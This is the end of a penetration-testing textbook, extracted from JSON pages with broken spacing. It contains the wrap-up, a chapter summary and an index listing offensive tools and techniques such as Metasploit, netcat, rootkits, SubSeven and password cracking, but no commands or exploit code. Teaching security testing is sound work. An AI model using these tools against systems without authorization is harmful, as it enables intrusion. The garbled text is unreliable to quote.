ational s ecurity Agency or the d epartment of Homeland s ecurity to verify the value of the cur- riculum. You can find more about this program at: http://www.nsa.gov/ia/ academic_outreach/nat_cae/index.shtml it is well worth your time to take a close look and examine the various security testing methodologies including the op en so urce se curity te sting me thodology ma nual ( o sstmm ) . th is book focused on the specific tools and methods used in a penetration test. o sstmm provides security professionals with a well- defined, mature framework that can be implemented in conjunction with many of the topics covered in this book. Another great penetration testing methodology can be found at: http://www. vulnerabilityassessment.co.uk. t he Penetration testing f ramework (P tf) is an excellent resource for penetration testers and security assessment teams. t he Ptf includes assessment templates as well as a robust list of tools that can be used to conduct each phase. WRA p Up if you read the book from front to back, take a minute to stop and consider all that you learned. At this point, you should have a solid understanding of the various steps involved in a typical penetration test and the tools required to complete each of the steps. m ore importantly, you should understand how the penetration testing process flows and how to take the information and out- put from each of the phases and feed those results into the next phase. m any people are eager to learn about hacking and penetration testing, but most new- comers only understand how to run a single tool or complete a single step. t hey refuse to see the big picture and often end up spinning their wheels in frustration when their tool does not work or provides unexpected results. t his group does not realize how the entire process works and how to leverage the power of each phase to strengthen the phases that come after it. for those of you who stuck with the book, completed each of the examples, and gave an honest effort at following along, at the very least, this book should have provided you with the knowledge and ability to see the big picture and understand the importance of each phase. You also now should have the ability to answer the question posed to you in a scenario at the beginning of chapter 2: Assume you are an ethical penetration tester working for a security company. Your boss walks over to your office and hands you a piece of paper. “I just got off the phone with the CEO of that company. He wants my best employee to Pen Test his company – that’s you. Our Legal Department will be sending you an email confirming we"},{"pageNumber":175,"pageContent":"The Basics of hacking and penetration T esting 156 have all of the proper authorizations and insurance”. You nod, accepting the job. He leaves. You flip over the paper, a single word is written on the paper, “Syngress.” It’s a company you’ve never heard of before, and no other information is written on the paper. What now? Th E CIRCLE Of LIfE one of the greatest attributes of penetration testing and hacking is that you nev er reach the end. Just about the time you master a particular topic or tech- nique, someone develops a new method, attack, or procedure. t hat is not to say that your original skillset is obsolete. o n the contrary, a solid understand- ing of the basics provides you with a lifelong foundation for learning the advanced topics and staying current with the rapid pace of change. e njoy the journey! Patrick SUMMAR y th is chapter focused on the importance of writing the penetration testing report and examined specific details about what needs to be included and poten- tial pitfalls for hackers who have never written a penetration testing report. th e importance of presenting a quality report to the client was emphasized. th e chapter concluded with suggestions about where you can go to further enhance your hacking skills once you have mastered the basics. sp ecific recom- mendations for getting advanced training and becoming part of the security community were also outlined."},{"pageNumber":176,"pageContent":"157 Index A Access, maintaining, 127 Back o rifice , 144 n cat, 143–144 n etbus , 134–135 n etcat, 128–133 c ryptcat, 133–134 practicing, 142–143 rootkits , 135–141 detecting and defending against, 141–142 Hacker d efender , 137–141 s ocat, 143–144 s ub s ev en ( s ub7), 144 A ccess c ontrol l ists (A cl s), 56 A cl s . See Access c ontrol l ists (A cl s) A ctive reconnaissance, 18, 25 Advanced security concepts, 153 A f P , 67 “Allintitle:” directive, 23 AP t (A dvanced Package t ool), 4 Attack v ectors, 66, 108, 121 Authorization, 3 B Back o rifice, 144 Backtrack, 5, 6, 26–27, 36, 69, 83–84 working with, 6–9 Backtrack l inux, 3–6, 154 Base64, 1 16 Bdcli100.exe, 137 Ben o wned, 38, 80, 86, 1 18, 119 Bind and reverse payloads, difference between, 80 Bing, 26 Black Hat conference, 154 Brute forcing letter combinations, 87 Burp Proxy, 125 Burp s uite , 125 C c A n VA s , 71 c arl- f redrik, 134 c hat rooms , 152 c ircle of life , 156 c isco A s A firew all, 20–21 c ode injection attacks , 116–120 c ore i mpact, 62, 7 1 c ross-site scripting ( xss ), 12 1–123 c ryptcat, 133–134 D d akota s tate University website, 22 d a wes, r ogan, 11 1 d efcon, 152–153 d efcon, 6, 144 d efcon, 12, 7 0 d efcon, 13, 2 1 d e- ice cd s , 102 d H c P serv er, 7, 8 d ig, 35–36 d irect x ploit, 144 dns serv ers. See d omain n ame s y stems ( dns ) serv ers d omain n ame s y stems ( dns ) serv ers, 28, 29 extracting information from, 32–36 d sniff, 94 E e -mail address, 25, 26, 68, 77 e -mail serv er, extracting information from, 36 “eth0” interface, 7–8 e thereal, 95 e thical hackers , 2, 3, 18, 57 and malicious hacker, 3 e ttercap, 1 04 e xecutiv e summary, 147 e xploitation, 13, 65 e ttercap, 1 04 f ast- t rack Autop wn, 97–100 Hydra, 67, 103–104 John the r ipper , 81–89 macof program, 93–97 m edusa, 67–7 0 m etasploit, 7 0–81, 104–105 network traffic, sniffing, 92–93 password resetting, 89–92 practicing, 100–103 r ainbow c rack, 1 04 target and desired goal, 103–105 w ireshark, 1 04 f f acebook, 25–26 “ f ail closed”, concept of, 94 “ f ail open”, concept of, 94 f ast- t rack Autop wn, 97–100 fdisk tool, 84 f edora s ecurity s pin, 14 “filetype:” directiv e, 24 “ f irst o rder xss ”, 123 f Ping, 47 ft P , 67, 96, 97 G g mail, 25 g oogle , 21, 22–26 g oogle cache , 23–24 g oogle- f u, 22, 40 g oogle Hacking, 2 1 Google Hacking for Penetration Testers , 21, 40 g raphical user interface ( g U i ), 48–49 g U i . See g raphical user interface ( g U i ) h Hacker d efender, 137–141 Hacking lab, use and creation of, 9–1 0 Harvester, 26–28, 68 accessing, 26–27 output, 28 Hash, 82 H d m oore , 70, 71 Hobbit, 128 Host command, 29, 31–32, 33 output, 32 Hotmail, 25 hsdef100 file, 137 D o w n l o a d f r o m W o w ! e B o o k < w w w . w o w e b o o k . c o m >"},{"pageNumber":177,"pageContent":"Index 158 HttP, 67 H ttrack, 19–22 accessing, 19 Hub , 93 hxdef100.exe, 137 hxdef100.ini, 137, 140 Hydra, 67, 103–104 icm P echo request packets , 46 I “ifconfig”, 7, 8 im AP, 67 i nformation gathering. See reconnaissance i nsecure.org, 62 i nternet, 108 “intitle:” directive, 23 “inurl:” directive, 23 .iso image, 5 J John the ripper (Jt r), 81–89, 103 K kAtA nA, 14 k- start dragon, 19, 72, 98, 112 L lan manager ( lm), 86 l inux, 5, 46, 57 passwords, cracking of, 88–89 l inux Backtrack, 77 lm . See lan manager ( lm) l odge, david, 108 l ong, Johnny d efcon, 13, 21 g oogle Hacking database (gHdB), 40 “lo” interface, 7–8 M macof program, 93–97 m aintaining access. See Access, maintaining m alicious hacker and ethical hackers, 3, 28 “man host” command, 32 m artorella, christian, 26 m atriux, 14 m edusa, 67–70 practicing, 103 m etagoofil, 36–37 information gathering with, 69 m etasploit, 16, 17, 70–81, 94, 97, 102, 146 m etasploitable, 102 “metasploit Unleashed”, 102 m eterpreter, 79–81, 83, 104–105, 132–133 m icrosoft, 5, 7, 86, 87 m obman, 144 ms 08-067, 73–74, 75, 76 ms 09-001, 74, 75 m sfconsole, 72, 73 ms -sQl, 67 m yspace, 25 m ysQl, 67, 117 N nessus, 58–61, 73, 146 screenshot of, 59 setting up, 60 steps to install, 58–59 n etbus, 134–135, 144 n etcat, 128–133, 139, 142 c ryptcat, 133–134 n etcraft, 31 n etware ncP, 67 n etwork interface card ( nic), 92–93 n etwork traffic, sniffing, 92–93 nic . See network interface card (nic) n ikto, 108–109 n map, 48, 73, 131, 146 and null scans, 56–57 and sYn scan, 51–52 and tc P connect scan, 49–51 and UdP scans, 52–55 and xmas scan, 55–56 nnt P, 67 ns lookup, 34–35 “nslookup” command, 34 n ull scans, using nmap to perform, 56–57 O offensive security, 3 o nline password crackers, 67 o pen source security t esting m ethodology manual (osstmm ), 155 o pen w eb Application security Project ( ow A sP) organization, 123, 125 osstmm . See open source security testing methodology manual (osstmm ) osx passwords, cracking, 88 o w A sP t op t en Project, 124 p Paros Proxy, 125 Passive reconnaissance, 18, 21 Password dictionary, 68, 87 Password hashes, 82, 83, 86 Password resetting, 89–92 “patch.exe”, 135 Paterva's maltego ce, 40–41 Payloads, 13, 71, 79 reverse, 79 Pc Anywhere, 67 Penetration testing, 1, 66, 145 advanced security concepts, 152–153 Backtrack, working with, 6–9 Backtrack linux, 3–6 books for, 154 circle of life, 156 definition of, 1 getting started, 2–3 guidelines, 153–155 hacking lab, use and creation of, 9–10 phases of, 10 four-step model, 13–14 report writing, 146 detailed report, 147–149 executive summary, 147 raw output, 149–152 Penetration t esting framework (Ptf), 155 PgP server, 26 Ping and ping sweeps, 46–48 Poc attacks. See Proof of concept (Poc) attacks PoP3, 67 Port numbers, and corresponding services, 45 Port scanning, 13, 48 null scans and nmap, 56–57 s Yn scan and nmap, 51–52 t c P connect scan and nm ap, 49–51 three-way handshake, 49, 57–58 UdP scans and nmap, 52–55 x mas scan and nmap, 55–56 Poweroff command, 8 Proof of concept (P oc) attacks, 1, 101, 148 Ptf. See Penetration t esting f ramework (P tf) Python script, 26, 37"},{"pageNumber":178,"pageContent":"Index 159 R rainbo w crack, 104 rapid, 7, 7 1 reboot command, 8 reconnaissance , 10–11, 13, 15 dig, 35–36 dns servers, 32–36 e-mail server, extracting information from, 36 m etagoofil, 36–37 finding attackable targets, 39 g oogle directives, 22–26 host command, 31–32 Harvester, 26–28 Htt rack, 19–22 information gathering, adv anced topics in, 40–41 Google Hacking for Penetration Testers , 40 Johnny long's google Hacking d atabase ( gHdB), 40 Paterva's maltego ce, 40–41 s earch engine Assessment t ool ( seAt ), 40 search engine directives for sites other than google, 40 n etcraft, 31 ns lookup, 34–35 practicing, 39–40 social engineering, 38–39 w hois, 28–31 “r eferral U rl:”, 30 remote access service , 67–70 report writing, 146 detailed report, 147–149 executiv e summary, 147 raw output, 149–152 rev erse payloads, 79, 80 rexec , 67 rfc , 55 rlogin , 67 rootkits , 128, 135 detecting and defending against, 141–142 Hacker defender, 137–141 practice, 143 S saint, 62 s Am (security Account manager) file, 83–84, 85 s amdump2, 84–85, 86 s Am Juicer tool, 81, 83–84 s canning, 43 pings and ping sweeps, 46–48 port scanning, 48 null scans and nmap, 56–57 s Yn scan and nmap, 51–52 t cP connect scan and nmap, 49–51 three-way handshake, 49 UdP scans and nmap, 52–55 wrap up, 57–58 x mas scan and nmap, 55–56 practicing, 61–62 steps in, 43–46 vulnerability scanning, 58–61 s earch engine Assessment tool ( seAt ), 40 s earch engine directives, for sites other than google, 40 se A t. See search engine Assessment tool ( seA t ) s ecurity Account manager file. See sAm (security Account m anager) file s ecurity-related curriculum, 154, 155 selec t statement, 118 7zip, 150 “site r eport”, 3 1 smt P-AU tH, 67 s niffing, 92–93 snm P, 67 s ocial engineering, 38–39 s pidering, 111–114 s Ql. See structured Query language (sQl) ss H, 58, 67 ss Hv2, 67 Star Wars , 2 “stealth scan”, 51 s tored xss, 123 s tructured Query language ( sQl), 117, 118 s ubseven ( sub7), 144 s ullo, chris, 108 s un microsystem, 5 “swiss army knife”. See netcat s Yn/A ck packet, 49 s yngress.com, 29, 31, 32, 154 s Yn scan, 51–52 System32 directory, 132–133 T tc P (transmission control Protocol) connect scan, 49–51, 53 telnet, 58, 67 t hree-way handshake, 49 true crypt, 150 twitter , 25–26 U UdP (User datagram Protocol), 53 and nmap, 52–55 Usenet, 25 v VirtualBox, 5 Virtual P c, 5 Vmware image, 5 Vmware Player, 5–6 Vnc software, 67, 76 Vulnerability assessment and penetration testing, 1–2 Vulnerability scanner, 71 Vulnerability scanning, 13, 45, 58–61 W web-based exploitation, 1 07 code injection attacks, 116–120 cross-site scripting, 121–123 interrogating web servers, 108–109 spidering, 111–114 web scarab, 112, 113, 115–116 websecurify , 110–111 web f orm, 67 web goat, 123–124 web scarab, 111–113, 115–116 websecurify , 110–111 w hois, 28–31 w ilhelm, thomas, 102 w indows version, 46 w ireshark, 94–96, 97, 104 X xmas scan and nmap, 55–56 xss . See cross-site scripting ( xss)"}]
